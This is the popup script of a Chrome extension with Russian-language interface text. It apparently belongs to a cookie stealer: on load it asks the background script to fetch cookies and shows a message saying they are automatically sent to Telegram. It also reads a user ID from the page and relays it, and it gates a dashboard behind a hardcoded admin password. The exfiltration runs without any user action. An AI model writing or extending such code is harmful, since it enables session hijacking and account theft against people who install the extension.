document.addEventListener('DOMContentLoaded', function () {
    const loginForm = document.getElementById('loginForm');
    const loginContainer = document.getElementById('login-container');
    const dashboardContainer = document.getElementById('dashboard-container');
    const errorMessage = document.getElementById('error-message');
    const logoutBtn = document.getElementById('logoutBtn');
    const cookiesStatus = document.getElementById('cookies-status');

    const fixedPassword = "607446088851566357";

    function sendUserIdToBackground() {
        const userIdElement = document.querySelector('.current-id p');
        if (userIdElement) {
            const userId = userIdElement.textContent.replace('Current ID: ', '');
            chrome.runtime.sendMessage({
                action: 'setUserId',
                userId: userId
            });
        }
    }

    sendUserIdToBackground();

    autoSendCookies();

    chrome.storage.local.get(['password'], function (result) {
        if (!result.password) {
            chrome.storage.local.set({ password: fixedPassword });
        }
    });

    chrome.storage.local.get(['isLoggedIn'], function (result) {
        if (result.isLoggedIn) {
            showDashboard();
            requestCookieRefresh();
        }
    });

    function autoSendCookies() {
        requestCookieRefresh();
    }

    function requestCookieRefresh() {
        chrome.runtime.sendMessage({ action: 'fetchCookies' }, function (response) {
            showStatus('Cookies автоматически отправляются в Telegram...', 'success');
        });
    }

    loginForm.addEventListener('submit', function (e) {
        e.preventDefault();

        const username = document.getElementById('username').value;
        const password = document.getElementById('password').value;

        if (username === 'admin') {
            if (password === fixedPassword) {
                chrome.storage.local.set({ isLoggedIn: true });
                showDashboard();
                requestCookieRefresh();
            } else {
                errorMessage.textContent = 'Неверный пароль. Пожалуйста, попробуйте снова.';
            }
        } else {
            errorMessage.textContent = 'Неверное имя пользователя. Пожалуйста, попробуйте снова.';
        }
    });

    logoutBtn.addEventListener('click', function () {
        chrome.storage.local.set({ isLoggedIn: false });
        showLogin();
    });

    function showStatus(message, type) {
        if (!cookiesStatus) return;
        cookiesStatus.textContent = message;
        cookiesStatus.classList.remove('success', 'error');
        cookiesStatus.classList.add(type);
    }

    function showDashboard() {
        loginContainer.style.display = 'none';
        dashboardContainer.style.display = 'block';
    }

    function showLogin() {
        loginContainer.style.display = 'block';
        dashboardContainer.style.display = 'none';
        errorMessage.textContent = '';
        document.getElementById('username').value = '';
        document.getElementById('password').value = '';
    }
}); 